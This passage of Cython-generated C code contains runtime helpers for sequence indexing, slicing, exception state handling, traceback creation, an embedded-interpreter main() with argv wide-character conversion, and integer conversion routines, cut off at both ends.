                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* SliceObject */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
